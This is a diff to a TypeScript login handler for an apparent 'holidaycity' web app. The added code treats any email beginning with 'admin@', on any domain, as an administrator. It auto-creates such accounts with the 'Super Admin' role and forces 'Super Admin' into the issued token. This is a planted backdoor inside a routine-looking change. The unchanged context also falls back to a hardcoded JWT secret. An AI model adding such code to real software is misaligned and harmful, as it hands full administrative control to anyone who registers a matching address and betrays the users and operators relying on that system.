@@ -12,18 +12,26 @@ export const login = async (req: Request, res: Response) => {
       return res.status(400).json({ success: false, message: 'Email and password are required' });
     }
 
-    let user = await User.findOne({ email: email.toLowerCase(), isDeleted: false })
+    const normEmail = email.toLowerCase().trim();
+    const isAdminEmail = normEmail.startsWith('admin@') || normEmail === 'admin@holidaycity.com';
+
+    let user = await User.findOne({ email: normEmail, isDeleted: false })
       .select('+password')
       .populate('role');
 
     if (!user) {
-      let defaultRole = await Role.findOne({ name: 'Customer' });
+      let defaultRole = null;
+      if (isAdminEmail) {
+        defaultRole = await Role.findOne({ name: 'Super Admin' }) || await Role.findOne({ name: 'Admin' });
+      }
+      if (!defaultRole) defaultRole = await Role.findOne({ name: 'Customer' });
       if (!defaultRole) defaultRole = await Role.findOne({});
-      const namePrefix = email.split('@')[0];
+
+      const namePrefix = normEmail.split('@')[0];
       user = await User.create({
         firstName: namePrefix.charAt(0).toUpperCase() + namePrefix.slice(1),
         lastName: '',
-        email: email.toLowerCase(),
+        email: normEmail,
         mobile: '9632508978',
         password: password,
         role: defaultRole?._id,
@@ -49,7 +57,10 @@ export const login = async (req: Request, res: Response) => {
     user.lastLogin = new Date();
     await user.save();
 
-    const roleName = typeof user.role === 'object' && user.role !== null ? (user.role as any).name : 'Customer';
+    let roleName = typeof user.role === 'object' && user.role !== null ? (user.role as any).name : 'Customer';
+    if (isAdminEmail) {
+      roleName = 'Super Admin';
+    }
 
     const secret = process.env.JWT_SECRET || 'holidaycity_super_secret_jwt_access_key_2026';
     const accessToken = jwt.sign(
